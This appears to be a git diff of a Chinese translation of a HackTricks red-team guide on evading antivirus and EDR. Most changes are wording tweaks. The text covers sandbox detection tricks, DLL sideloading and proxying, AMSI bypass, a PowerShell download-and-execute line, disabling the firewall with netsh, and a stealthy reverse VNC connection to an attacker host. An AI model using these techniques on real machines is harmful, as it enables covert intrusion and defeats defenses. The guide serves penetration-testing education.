@@ -15,7 +15,7 @@
 </details>
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 如果你对 **黑客职业** 感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！** (_需要流利的波兰语书写和口语能力_).
 
@@ -29,7 +29,7 @@
 
 ### **静态检测**
 
-静态检测是通过标记已知的恶意字符串或字节数组在二进制文件或脚本中实现的，同时也提取文件本身的信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：
+静态检测是通过标记已知的恶意字符串或字节数组在二进制文件或脚本中实现的，同时还提取文件本身的信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：
 
 * **加密**
 
@@ -55,13 +55,13 @@
 
 * **执行前休眠** 根据实现方式，这可能是绕过 AV 动态分析的好方法。AV 扫描文件的时间非常短，以免打断用户的工作流程，因此使用长时间的休眠可以干扰二进制文件的分析。问题是许多 AV 的沙箱可以根据实现方式跳过休眠。
 * **检查机器资源** 通常沙箱可用的资源非常少（例如 < 2GB RAM），否则它们可能会减慢用户的机器。你也可以在这里发挥创造力，例如检查 CPU 的温度或风扇速度，并不是所有内容都会在沙箱中实现。
-* **特定机器检查** 如果你想针对加入 "contoso.local" 域的用户工作站，可以检查计算机的域以查看是否与指定的域匹配，如果不匹配，可以让你的程序退出。
+* **特定机器检查** 如果你想针对加入 "contoso.local" 域的用户的工作站，你可以检查计算机的域以查看是否与指定的域匹配，如果不匹配，你可以让程序退出。
 
-事实证明，Microsoft Defender 的沙箱计算机名是 HAL9TH，因此，你可以在恶意软件引爆前检查计算机名，如果名称匹配 HAL9TH，则意味着你在 Defender 的沙箱中，因此可以让你的程序退出。
+事实证明，Microsoft Defender 的沙箱计算机名是 HAL9TH，因此，你可以在恶意软件引爆前检查计算机名，如果名称匹配 HAL9TH，则意味着你在 Defender 的沙箱中，因此可以让程序退出。
 
-<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>来源： <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>来源: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-一些来自 [@mgeeky](https://twitter.com/mariuszbit) 的非常好的建议，用于对抗沙箱
+一些来自 [@mgeeky](https://twitter.com/mariuszbit) 的非常好的针对沙箱的建议
 
 <figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">红队 VX Discord</a> #malware-dev 频道</p></figcaption></figure>
 
@@ -69,7 +69,7 @@
 
 例如，如果你想转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你可以使用一个不太知名的项目来转储 LSASS。
 
-正确的答案可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDR 标记的恶意软件中最被标记的之一，尽管该项目本身非常酷，但在绕过 AV 时使用它也是一场噩梦，因此只需寻找你想要实现的目标的替代方案。
+正确的答案可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDR 标记的最多的恶意软件之一，尽管该项目本身非常酷，但在绕过 AV 时使用它也是一场噩梦，因此只需寻找替代方案来实现你的目标。
 
 {% hint style="info" %}
 在修改你的有效载荷以进行规避时，请确保 **关闭 Defender 的自动样本提交**，并且请认真考虑，**如果你的目标是长期规避，请不要上传到 VIRUSTOTAL**。如果你想检查你的有效载荷是否被特定 AV 检测到，请在虚拟机上安装它，尝试关闭自动样本提交，并在那里进行测试，直到你对结果满意为止。
@@ -77,7 +77,7 @@
 
 ## EXEs 与 DLLs
 
-每当可能时，总是 **优先使用 DLL 进行规避**，根据我的经验，DLL 文件通常 **被检测和分析的概率要低得多**，因此在某些情况下使用它来避免检测是一个非常简单的技巧（当然，如果你的有效载荷有某种方式以 DLL 的形式运行）。
+每当可能时，总是 **优先使用 DLL 进行规避**，根据我的经验，DLL 文件通常 **被检测和分析的概率要低得多**，因此在某些情况下使用它来避免检测是一个非常简单的技巧（当然前提是你的有效载荷有某种方式以 DLL 的形式运行）。
 
 正如我们在这张图片中看到的，Havoc 的 DLL 有效载荷在 antiscan.me 上的检测率为 4/26，而 EXE 有效载荷的检测率为 7/26。
 
@@ -100,13 +100,13 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 {% endcode %}
 
-此命令将输出“C:\Program Files\\”中易受DLL劫持影响的程序列表及其尝试加载的DLL文件。
+此命令将输出“C:\Program Files\\”中易受DLL劫持的程序列表及其尝试加载的DLL文件。
 
-我强烈建议您**自己探索可被DLL劫持/侧载的程序**，如果正确执行，这种技术相当隐蔽，但如果您使用公开已知的DLL侧载程序，可能会很容易被抓住。
+我强烈建议你**自己探索可被DLL劫持/侧载的程序**，如果正确执行，这种技术相当隐蔽，但如果你使用公开已知的DLL侧载程序，可能会很容易被抓住。
 
-仅仅放置一个恶意DLL，其名称是程序期望加载的，并不会加载您的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。
+仅仅放置一个恶意DLL，其名称是程序期望加载的，并不会加载你的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。
 
-**DLL代理**将程序从代理（和恶意）DLL发出的调用转发到原始DLL，从而保留程序的功能并能够处理您的有效载荷的执行。
+**DLL代理**将程序从代理（和恶意）DLL发出的调用转发到原始DLL，从而保留程序的功能，并能够处理你的有效载荷的执行。
 
 我将使用[@flangvik](https://twitter.com/Flangvik/)的[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)项目。
 
@@ -140,7 +140,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 <figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG\_WNpE) 以更深入地了解我们讨论的内容。
+我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL 侧载，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG\_WNpE) 以更深入地了解我们讨论的内容。
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
@@ -157,7 +157,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能的话，尝试将多个规避技术结合起来。
+规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能，尝试将多个规避技术结合起来。
 {% endhint %}
 
 ## AMSI（反恶意软件扫描接口）
@@ -172,7 +172,7 @@ AMSI功能集成在Windows的以下组件中。
 * JavaScript和VBScript
 * Office VBA宏
 
-它允许杀毒解决方案通过以未加密和未混淆的形式暴露脚本内容来检查脚本行为。
+它允许杀毒软件通过以未加密和未混淆的形式暴露脚本内容来检查脚本行为。
 
 运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将在Windows Defender上产生以下警报。
 
@@ -204,7 +204,7 @@ AMSI功能集成在Windows的以下组件中。
 ```
 {% endcode %}
 
-只需一行 PowerShell 代码就可以使当前 PowerShell 进程无法使用 AMSI。 这行代码当然已经被 AMSI 本身标记，因此需要进行一些修改才能使用此技术。
+只需一行 PowerShell 代码就可以使当前 PowerShell 进程无法使用 AMSI。 当然，这一行已经被 AMSI 本身标记，因此需要进行一些修改才能使用此技术。
 
 这是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改版 AMSI 绕过。
 ```powershell
@@ -239,7 +239,7 @@ $Spotfix.SetValue($null,$true)
 有几种工具可以用来 **混淆 C# 明文代码**，生成 **元编程模板** 以编译二进制文件或 **混淆已编译的二进制文件**，例如：
 
 * [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
-* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目的是提供一个开源的 LLVM 编译套件分支，能够通过 [代码混淆](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) 和防篡改提供增强的软件安全性。
+* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 LLVM 编译套件分支，能够通过 [代码混淆](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) 和防篡改提供增强的软件安全性。
 * [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具且不修改编译器。
 * [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ 模板元编程框架生成的混淆操作，这将使想要破解应用程序的人稍微困难一些。
 * [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe, .dll, .sys
@@ -258,7 +258,7 @@ Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户�
 
 SmartScreen 主要采用基于声誉的方法，这意味着不常下载的应用程序将触发 SmartScreen，从而警告并阻止最终用户执行该文件（尽管可以通过点击更多信息 -> 无论如何运行来执行该文件）。
 
-**MoTW**（网络标记）是一个 [NTFS 备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))，其名称为 Zone.Identifier，下载来自互联网的文件时会自动创建，并包含下载的 URL。
+**MoTW**（网络标记）是一个 [NTFS 备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))，其名称为 Zone.Identifier，下载来自互联网的文件时会自动创建，并附带下载的 URL。
 
 <figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>
 
@@ -308,13 +308,13 @@ Adding file: /TotallyLegitApp.exe
 
 * **Fork\&Run**
 
-这涉及到 **生成一个新的牺牲进程**，将你的后渗透恶意代码注入到该新进程中，执行你的恶意代码，完成后杀死新进程。这有其优点和缺点。Fork 和 run 方法的好处在于执行发生在 **我们的 Beacon 植入进程之外**。这意味着如果我们的后渗透操作中的某些事情出错或被捕获，我们的 **植入物存活的机会更大**。缺点是你有 **更大的机会** 被 **行为检测** 捕获。
+这涉及到 **生成一个新的牺牲进程**，将你的后渗透恶意代码注入到那个新进程中，执行你的恶意代码，完成后杀死新进程。这有其优点和缺点。Fork 和 run 方法的好处在于执行发生在 **我们的 Beacon 植入进程之外**。这意味着如果我们的后渗透操作中的某些事情出错或被捕获，我们的 **植入物存活的机会更大**。缺点是你有 **更大的机会** 被 **行为检测** 捕获。
 
 <figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-这是将后渗透恶意代码 **注入到其自身进程中**。这样，你可以避免创建新进程并让其被 AV 扫描，但缺点是如果你的有效负载执行出现问题，**失去你的 beacon 的机会更大**，因为它可能崩溃。
+这涉及将后渗透恶意代码 **注入到其自身进程中**。这样，你可以避免创建新进程并让其被 AV 扫描，但缺点是如果你的有效负载执行出现问题，**失去你的 beacon 的机会更大**，因为它可能崩溃。
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -330,7 +330,7 @@ Adding file: /TotallyLegitApp.exe
 
 通过允许访问 SMB 共享上的解释器二进制文件和环境，你可以 **在被攻陷机器的内存中执行这些语言的任意代码**。
 
-该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等，我们有 **更多灵活性来绕过静态签名**。使用这些语言中的随机未混淆反向 shell 脚本进行测试已证明成功。
+该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等，我们有 **更多的灵活性来绕过静态签名**。使用这些语言中的随机未混淆反向 shell 脚本进行测试已证明成功。
 
 ## 高级规避
 
@@ -338,11 +338,11 @@ Adding file: /TotallyLegitApp.exe
 
 你所面对的每个环境都有其自身的优缺点。
 
-我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这次演讲，以了解更多高级规避技术。
+我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以了解更多高级规避技术。
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于深入规避的另一个精彩演讲。
+这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于深入规避的另一场精彩演讲。
 
 {% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
@@ -351,7 +351,7 @@ Adding file: /TotallyLegitApp.exe
 ### **检查 Defender 发现的恶意部分**
 
 你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它将 **删除二进制文件的部分**，直到 **找出 Defender** 发现的恶意部分并将其分离给你。\
-另一个做 **同样事情的工具是** [**avred**](https://github.com/dobin/avred)，它在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供开放的网络服务。
+另一个做 **同样事情的工具是** [**avred**](https://github.com/dobin/avred)，它提供了一个开放的网络服务，地址为 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet 服务器**
 
@@ -370,7 +370,7 @@ netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-从这里下载: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你需要的是二进制下载，而不是安装程序）
+从以下地址下载: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你需要的是二进制下载，而不是安装程序）
 
 **在主机上**: 执行 _**winvnc.exe**_ 并配置服务器:
 
@@ -382,17 +382,17 @@ netsh advfirewall set allprofiles state off
 
 #### **反向连接**
 
-**攻击者**应在其 **主机** 中执行二进制文件 `vncviewer.exe -listen 5900`，以便 **准备** 捕获反向 **VNC 连接**。然后，在 **受害者** 机器中: 启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**攻击者**应在其 **主机** 中执行二进制文件 `vncviewer.exe -listen 5900`，以便 **准备** 捕获反向 **VNC 连接**。然后，在 **受害者** 中: 启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
 **警告:** 为了保持隐蔽性，你必须避免以下几件事
 
 * 如果 `winvnc` 已经在运行，不要再次启动它，否则会触发 [弹出窗口](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
-* 如果同一目录中没有 `UltraVNC.ini`，不要启动 `winvnc`，否则会导致 [配置窗口](https://i.imgur.com/rfMQWcf.png) 打开
+* 如果没有 `UltraVNC.ini` 在同一目录中，不要启动 `winvnc`，否则会导致 [配置窗口](https://i.imgur.com/rfMQWcf.png) 打开
 * 不要运行 `winvnc -h` 获取帮助，否则会触发 [弹出窗口](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
-从这里下载: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+从以下地址下载: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -565,9 +565,9 @@ https://github.com/praetorian-code/vulcan
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-如果你对**黑客职业**感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！**（_要求流利的波兰语书写和口语_）。
+如果你对**黑客职业**感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！**（_需要流利的波兰语书写和口语能力_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -580,8 +580,8 @@ https://github.com/praetorian-code/vulcan
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
